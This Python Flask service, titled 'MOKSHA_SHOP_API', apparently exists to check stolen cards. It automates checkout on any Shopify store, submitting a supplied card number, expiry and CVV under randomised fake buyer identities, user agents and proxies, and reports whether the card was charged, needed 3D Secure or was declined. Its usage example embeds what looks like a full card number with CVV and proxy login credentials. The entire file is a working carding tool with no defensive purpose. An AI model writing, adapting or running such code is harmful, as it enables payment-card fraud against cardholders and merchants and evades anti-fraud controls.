from flask import Flask, request, jsonify
import asyncio
import random
from fake_useragent import UserAgent
import httpx
import re
import json
from urllib.parse import urlparse
import sys
import os

app = Flask(__name__)

try:
    sys.stdout.reconfigure(encoding='utf-8')
except AttributeError:
    pass

def find_between(s, start, end):
    try:
        if start in s and end in s:
            return (s.split(start))[1].split(end)[0]
        return ""
    except:
        return ""

class ShopifyAuto:
    def __init__(self, proxy=None):
        self.user_agent = UserAgent().random
        self.proxy = proxy
    
    async def get_random_info(self):
        us_addresses = [
            {"add1": "123 Main St", "city": "Portland", "state": "Maine", "state_short": "ME", "zip": "04101"},
            {"add1": "456 Oak Ave", "city": "Portland", "state": "Maine", "state_short": "ME", "zip": "04102"},
            {"add1": "789 Pine Rd", "city": "Portland", "state": "Maine", "state_short": "ME", "zip": "04103"},
            {"add1": "321 Elm St", "city": "Bangor", "state": "Maine", "state_short": "ME", "zip": "04401"},
            {"add1": "654 Maple Dr", "city": "Lewiston", "state": "Maine", "state_short": "ME", "zip": "04240"}
        ]
        
        address = random.choice(us_addresses)
        first_name = random.choice(["John", "Emily", "Alex", "Sarah", "Michael", "Jessica", "David", "Lisa"])
        last_name = random.choice(["Smith", "Johnson", "Williams", "Brown", "Garcia", "Miller", "Davis"])
        email = f"{first_name.lower()}.{last_name.lower()}{random.randint(1, 999)}@gmail.com"
        
        valid_phones = [
            "2025550199", "3105551234", "4155559876", "6175550123",
            "9718081573", "2125559999", "7735551212", "4085556789"
        ]
        phone = random.choice(valid_phones)
        
        return {
            "fname": first_name,
            "lname": last_name,
            "email": email,
            "phone": phone,
            "add1": address["add1"],
            "city": address["city"],
            "state": address["state"],
            "state_short": address["state_short"],
            "zip": address["zip"]
        }

async def process_payment(site_url, cc, mon, year, cvv, proxy_raw=None):
    """Process payment and return results"""
    results = {
        "status": "processing",
        "steps": [],
        "final_result": None
    }
    
    # إعداد البروكسي
    proxies = None
    if proxy_raw:
        if not proxy_raw.startswith('http'):
            proxy_raw = f"http://{proxy_raw}"
        proxies = {
            "http://": proxy_raw,
            "https://": proxy_raw
        }
    
    try:
        async with httpx.AsyncClient(follow_redirects=True, timeout=30.0, proxies=proxies) as session:
            shop = ShopifyAuto(proxy=proxy_raw)
            results["steps"].append("Starting checkout process")
            
            # Step 1: Get product info
            product_response = await session.get(f'{site_url}/products.json')
            products_data = product_response.json()
            product = products_data['products'][0]
            variant_id = product['variants'][0]['id']
            price = product['variants'][0]['price']
            product_handle = product['handle']
            
            results["steps"].append(f"Product: {product['title']} - Price: ${price}")
            
            # Step 2: Visit product page for cookies
            await session.get(f"{site_url}/products/{product_handle}")
            results["steps"].append("Cookies collected")
            
            # Step 3: Add to cart
            await session.get(f'{site_url}/cart.js')
            add_data = {'id': str(variant_id), 'quantity': '1', 'form_type': 'product'}
            cart_response = await session.post(f'{site_url}/cart/add.js', data=add_data)
            
            if cart_response.status_code != 200:
                results["status"] = "error"
                results["error"] = "Failed to add item to cart"
                return results
                
            # Step 4: Get cart token
            cart_data = (await session.get(f"{site_url}/cart.js")).json()
            token = cart_data['token']
            results["steps"].append(f"Cart token: {token}")
            
            # Step 5: Go to checkout
            checkout_headers = {
                'accept': 'text/html,application/xhtml+xml',
                'content-type': 'application/x-www-form-urlencoded',
                'origin': site_url,
                'referer': f"{site_url}/cart",
                'user-agent': shop.user_agent,
            }
            
            await session.get(f"{site_url}/checkout", headers=checkout_headers)
            checkout_response = await session.post(f"{site_url}/cart", headers=checkout_headers, data={'checkout': '', 'updates[]': '1'})
            response_text = checkout_response.text
            
            # Step 6: Extract tokens
            session_token_match = re.search(r'name="serialized-sessionToken"\s+content="&quot;([^"]+)&quot;"', response_text)
            if not session_token_match:
                results["status"] = "error"
                results["error"] = "Failed to get session token"
                return results
                
            session_token = session_token_match.group(1)
            queue_token = find_between(response_text, 'queueToken&quot;:&quot;', '&quot;')
            stable_id = find_between(response_text, 'stableId&quot;:&quot;', '&quot;')
            paymentMethodIdentifier = find_between(response_text, 'paymentMethodIdentifier&quot;:&quot;', '&quot;')
            
            results["steps"].append("All tokens extracted")
            
            # Step 7: Get random info
            random_info = await shop.get_random_info()
            fname, lname = random_info["fname"], random_info["lname"]
            email_addr = random_info["email"]
            phone = random_info["phone"]
            add1, city, state_short, zip_code = random_info["add1"], random_info["city"], random_info["state_short"], str(random_info["zip"])
            
            # Step 8: Create payment session
            session_created = False
            sessionid = None
            session_endpoints = [
                "https://deposit.us.shopifycs.com/sessions",
                "https://checkout.shopifycs.com/sessions"
            ]
            
            for endpoint in session_endpoints:
                try:
                    headers = {
                        'authority': urlparse(endpoint).netloc,
                        'accept': 'application/json',
                        'content-type': 'application/json',
                        'origin': 'https://checkout.shopifycs.com',
                        'user-agent': shop.user_agent,
                    }
                    
                    json_data = {
                        'credit_card': {
                            'number': cc,
                            'month': mon,
                            'year': year,
                            'verification_value': cvv,
                            'name': f'{fname} {lname}',
                        },
                        'payment_session_scope': urlparse(site_url).netloc,
                    }
                    
                    session_response = await session.post(endpoint, headers=headers, json=json_data)
                    if session_response.status_code == 200:
                        session_data = session_response.json()
                        if "id" in session_data:
                            sessionid = session_data["id"]
                            session_created = True
                            break
                except:
                    continue
            
            if not session_created:
                results["status"] = "error"
                results["error"] = "Failed to create payment session"
                return results
                
            results["steps"].append(f"Payment session created: {sessionid[:20]}...")
            
            # Step 9: Submit payment via GraphQL
            graphql_url = f"{site_url}/checkouts/unstable/graphql"
            random_page_id = f"{random.randint(10000000, 99999999):08x}-{random.randint(1000, 9999):04X}-{random.randint(1000, 9999):04X}-{random.randint(1000, 9999):04X}-{random.randint(100000000000, 999999999999):012X}"
            
            graphql_headers = {
                'authority': urlparse(site_url).netloc,
                'accept': 'application/json',
                'content-type': 'application/json',
                'origin': site_url,
                'user-agent': shop.user_agent,
                'x-checkout-one-session-token': session_token,
                'x-checkout-web-deploy-stage': 'production',
                'x-checkout-web-source-id': token,
            }
            
            graphql_payload = {
                'query': 'mutation SubmitForCompletion($input:NegotiationInput!,$attemptToken:String!,$metafields:[MetafieldInput!],$postPurchaseInquiryResult:PostPurchaseInquiryResultCode,$analytics:AnalyticsInput){submitForCompletion(input:$input attemptToken:$attemptToken metafields:$metafields postPurchaseInquiryResult:$postPurchaseInquiryResult analytics:$analytics){...on SubmitSuccess{receipt{...ReceiptDetails __typename}__typename}...on SubmitAlreadyAccepted{receipt{...ReceiptDetails __typename}__typename}...on SubmitFailed{reason __typename}...on SubmitRejected{errors{...on NegotiationError{code localizedMessage __typename}__typename}__typename}...on Throttled{pollAfter pollUrl queueToken __typename}...on CheckpointDenied{redirectUrl __typename}...on SubmittedForCompletion{receipt{...ReceiptDetails __typename}__typename}__typename}}fragment ReceiptDetails on Receipt{...on ProcessedReceipt{id token __typename}...on ProcessingReceipt{id pollDelay __typename}...on ActionRequiredReceipt{id __typename}...on FailedReceipt{id processingError{...on PaymentFailed{code messageUntranslated __typename}__typename}__typename}__typename}',
                'variables': {
                    'input': {
                        'sessionInput': {'sessionToken': session_token},
                        'queueToken': queue_token,
                        'discounts': {'lines': [], 'acceptUnexpectedDiscounts': True},
                        'delivery': {
                            'deliveryLines': [{
                                'selectedDeliveryStrategy': {
                                    'deliveryStrategyMatchingConditions': {
                                        'estimatedTimeInTransit': {'any': True},
                                        'shipments': {'any': True},
                                    },
                                    'options': {},
                                },
                                'targetMerchandiseLines': {'lines': [{'stableId': stable_id}]},
                                'destination': {
                                    'streetAddress': {
                                        'address1': add1, 'address2': '', 'city': city,
                                        'countryCode': 'US', 'postalCode': zip_code,
                                        'firstName': fname, 'lastName': lname,
                                        'zoneCode': state_short, 'phone': phone,
                                    },
                                },
                                'deliveryMethodTypes': ['SHIPPING'],
                                'expectedTotalPrice': {'any': True},
                                'destinationChanged': True,
                            }],
                            'noDeliveryRequired': [],
                            'useProgressiveRates': False,
                        },
                        'merchandise': {
                            'merchandiseLines': [{
                                'stableId': stable_id,
                                'merchandise': {
                                    'productVariantReference': {
                                        'id': f'gid://shopify/ProductVariantMerchandise/{variant_id}',
                                        'variantId': f'gid://shopify/ProductVariant/{variant_id}',
                                        'properties': [],
                                    },
                                },
                                'quantity': {'items': {'value': 1}},
                                'expectedTotalPrice': {'any': True},
                                'lineComponents': [],
                            }],
                        },
                        'payment': {
                            'totalAmount': {'any': True},
                            'paymentLines': [{
                                'paymentMethod': {
                                    'directPaymentMethod': {
                                        'paymentMethodIdentifier': paymentMethodIdentifier,
                                        'sessionId': sessionid,
                                        'billingAddress': {
                                            'streetAddress': {
                                                'address1': add1, 'address2': '', 'city': city,
                                                'countryCode': 'US', 'postalCode': zip_code,
                                                'firstName': fname, 'lastName': lname,
                                                'zoneCode': state_short, 'phone': phone,
                                            },
                                        },
                                    },
                                },
                                'amount': {'any': True},
                            }],
                            'billingAddress': {
                                'streetAddress': {
                                    'address1': add1, 'address2': '', 'city': city,
                                    'countryCode': 'US', 'postalCode': zip_code,
                                    'firstName': fname, 'lastName': lname,
                                    'zoneCode': state_short, 'phone': phone,
                                },
                            },
                        },
                        'buyerIdentity': {
                            'buyerIdentity': {'presentmentCurrency': 'USD', 'countryCode': 'US'},
                            'contactInfoV2': {'emailOrSms': {'value': email_addr}},
                            'marketingConsent': [{'email': {'value': email_addr}}],
                        },
                        'taxes': {
                            'proposedTotalAmount': {'value': {'amount': '0', 'currencyCode': 'USD'}},
                            'proposedExemptions': [],
                        },
                    },
                    'attemptToken': f'{token}-{random.random()}',
                    'metafields': [],
                    'analytics': {
                        'requestUrl': f'{site_url}/checkouts/cn/{token}',
                        'pageId': random_page_id,
                    },
                },
                'operationName': 'SubmitForCompletion',
            }
            
            graphql_response = await session.post(graphql_url, headers=graphql_headers, json=graphql_payload)
            
            if graphql_response.status_code != 200:
                results["status"] = "error"
                results["error"] = f"GraphQL request failed: {graphql_response.status_code}"
                return results
                
            result_data = graphql_response.json()
            completion = result_data.get('data', {}).get('submitForCompletion', {})
            
            # Check errors
            if completion.get('errors'):
                errors = completion['errors']
                error_codes = [e.get('code') for e in errors if 'code' in e]
                results["status"] = "declined"
                results["error"] = f"CARD DECLINED: {', '.join(error_codes)}"
                return results
            
            if completion.get('reason'):
                results["status"] = "declined"
                results["error"] = f"Payment failed: {completion['reason']}"
                return results
            
            # Check receipt
            if completion.get('receipt'):
                receipt_id = completion['receipt'].get('id')
                
                # Poll for result
                for poll_attempt in range(5):
                    await asyncio.sleep(2)
                    poll_payload = {
                        'query': 'query PollForReceipt($receiptId:ID!,$sessionToken:String!){receipt(receiptId:$receiptId,sessionInput:{sessionToken:$sessionToken}){...ReceiptDetails __typename}}fragment ReceiptDetails on Receipt{...on ProcessedReceipt{id token redirectUrl orderIdentity{buyerIdentifier id __typename}__typename}...on ProcessingReceipt{id pollDelay __typename}...on ActionRequiredReceipt{id action{...on CompletePaymentChallenge{offsiteRedirect url __typename}__typename}__typename}...on FailedReceipt{id processingError{...on PaymentFailed{code messageUntranslated __typename}__typename}__typename}__typename}',
                        'variables': {
                            'receiptId': receipt_id,
                            'sessionToken': session_token,
                        },
                        'operationName': 'PollForReceipt'
                    }
                    
                    poll_response = await session.post(graphql_url, headers=graphql_headers, json=poll_payload)
                    if poll_response.status_code == 200:
                        poll_data = poll_response.json()
                        receipt = poll_data.get('data', {}).get('receipt', {})
                        
                        if receipt.get('__typename') == 'ProcessedReceipt' or 'orderIdentity' in receipt:
                            order_id = receipt.get('orderIdentity', {}).get('id', 'N/A')
                            results["status"] = "charged"
                            results["final_result"] = "CARD CHARGED SUCCESSFULLY!"
                            results["order_id"] = order_id
                            return results
                        elif receipt.get('__typename') == 'ActionRequiredReceipt':
                            results["status"] = "approved_3ds"
                            results["final_result"] = "Card Approved (3D Secure Required)"
                            return results
                        elif receipt.get('__typename') == 'FailedReceipt':
                            results["status"] = "declined"
                            results["final_result"] = "CARD DECLINED"
                            results["details"] = receipt.get('processingError', {})
                            return results
                
                results["status"] = "unknown"
                results["final_result"] = "Payment status unknown (timeout)"
            else:
                results["status"] = "unknown"
                results["final_result"] = "No receipt received"
                
        return results
        
    except Exception as e:
        results["status"] = "error"
        results["error"] = str(e)
        return results

@app.route('/')
def home():
    return jsonify({
        "MOKSHA_SHOP_API": "v1.0",
        "usage": "/shopify_checker?site=SITE_URL&cc=CC|MM|YY|CVV&proxy=PROXY(optional)"
    })

@app.route('/shopify_checker')
def shopify_checker():
    try:
        site = request.args.get('site')
        cc_data = request.args.get('cc')
        proxy = request.args.get('proxy')
        
        if not site or not cc_data:
            return jsonify({
                "error": "Missing parameters",
                "usage": "/shopify_checker?site=SITE_URL&cc=CC|MM|YY|CVV&proxy=PROXY(optional)",
                "example": "/shopify_checker?site=https://ferrierdesigns.myshopify.com&cc=5417559000138744|10|28|535&proxy=104.239.107.47:5699:wzwpqnjh:s7fuv03xpq4e"
            }), 400
        
        # Parse card data
        try:
            cc, mon, year, cvv = cc_data.split('|')
        except:
            return jsonify({"error": "Invalid card format. Use: CC|MM|YY|CVV"}), 400
        
        # Run async function
        loop = asyncio.new_event_loop()
        asyncio.set_event_loop(loop)
        result = loop.run_until_complete(process_payment(site, cc, mon, year, cvv, proxy))
        loop.close()
        
        return jsonify({
            "site": site,
            "card": f"{cc[:6]}...{cc[-4:]}",
            "proxy_used": bool(proxy),
            "result": result
        })
        
    except Exception as e:
        return jsonify({"error": str(e)}), 500

if __name__ == '__main__':
    port = int(os.environ.get('PORT', 5000))
    app.run(host='0.0.0.0', port=port)
